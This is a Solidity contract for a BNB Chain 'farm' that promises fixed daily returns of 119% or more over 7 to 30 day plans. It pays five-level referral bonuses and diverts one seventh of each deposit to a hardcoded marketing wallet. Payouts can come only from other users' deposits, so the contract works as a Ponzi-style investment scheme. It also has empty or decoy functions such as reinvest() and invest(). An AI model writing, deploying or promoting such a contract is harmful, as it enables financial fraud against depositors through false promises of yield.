/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

/*

https: https://binancefarm.org/

*/

// SPDX-License-Identifier: MIT License


pragma solidity >=0.8.0;

struct Plan {
  uint8 life_days;
  uint8 percent;
}

struct Deposit {
  uint8 plan;
  uint256 amount;
  uint40 time;
}

struct Farmer {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
}

contract BinanceFarm {
    address public owner; 
    address public marketing;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [80, 20, 10, 5, 5]; 

    mapping(uint8 => Plan) public plans;
    mapping(address => Farmer) public farmers;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 plan);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() {
        owner = msg.sender;  
         marketing=address(0xD446BC061391Ce2E7631d76E4aB55B31e9f71643); //foxed

        uint8 planPercent = 119;
        for (uint8 planDuration = 7; planDuration <= 30; planDuration++) {
            plans[planDuration] = Plan(planDuration, planPercent);
            planPercent+= 5;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            farmers[_addr].last_payout = uint40(block.timestamp);
            farmers[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = farmers[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            farmers[up].match_bonus += bonus;
            farmers[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = farmers[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(farmers[_addr].upline == address(0) && _addr != owner) {
            if(farmers[_upline].deposits.length == 0) {
                _upline = owner;
            }

            farmers[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                farmers[_upline].structure[i]++;

                _upline = farmers[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _plan, address _upline) external payable {
        require(plans[_plan].life_days > 0, "Plan not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Farmer storage farmer = farmers[msg.sender];

        require(farmer.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        farmer.deposits.push(Deposit({
            plan: _plan,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        farmer.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(marketing).transfer(msg.value / 7);
        
        emit NewDeposit(msg.sender, msg.value, _plan);
    }
    
    function withdraw() external {
        Farmer storage farmer = farmers[msg.sender];

        _payout(msg.sender);

        require(farmer.dividends > 0 || farmer.match_bonus > 0, "Zero amount");

        uint256 amount = farmer.dividends + farmer.match_bonus;

        farmer.dividends = 0;
        farmer.match_bonus = 0;
        farmer.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Farmer storage farmer = farmers[_addr];

        for(uint256 i = 0; i < farmer.deposits.length; i++) {
            Deposit storage dep = farmer.deposits[i];
            Plan storage plan = plans[dep.plan];

            uint40 time_end = dep.time + plan.life_days * 86400;
            uint40 from = farmer.last_payout > dep.time ? farmer.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * plan.percent / plan.life_days / 8640000;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Farmer storage farmer = farmers[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = farmer.structure[i];
        }

        return (
            payout + farmer.dividends + farmer.match_bonus,
            farmer.total_invested,
            farmer.total_withdrawn,
            farmer.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }

}